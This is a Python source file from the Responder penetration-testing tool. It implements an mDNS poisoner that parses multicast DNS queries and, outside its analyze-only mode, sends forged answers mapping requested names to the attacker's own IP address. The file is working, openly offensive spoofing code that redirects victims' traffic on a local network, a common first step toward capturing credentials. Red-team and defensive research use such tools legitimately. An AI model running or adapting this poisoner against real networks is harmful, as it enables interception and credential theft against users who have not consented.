#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import settings
import socket

from SocketServer import BaseRequestHandler
from packets import MDNS_Ans
from utils import *

def Parse_MDNS_Name(data):
	try:
		data = data[12:]
		NameLen = struct.unpack('>B',data[0])[0]
		Name = data[1:1+NameLen]
		NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
		Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
		return Name+'.'+Name_
	except IndexError:
		return None

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNS(BaseRequestHandler):

	def handle(self):

		MADDR = "224.0.0.251"
		MPORT = 5353

		data, soc = self.request
		Request_Name = Parse_MDNS_Name(data)

		# Break out if we don't want to respond to this host
		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
			return None

		try:
			# Analyze Mode
			if settings.Config.AnalyzeMode:
				if Parse_IPV6_Addr(data):
					print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3)))

			# Poisoning Mode
			else:
				if Parse_IPV6_Addr(data):
					
					Poisoned_Name = Poisoned_MDNS_Name(data)
					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
					Buffer.calculate()
					soc.sendto(str(Buffer), (MADDR, MPORT))
					
					print color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)

		except Exception:
			raise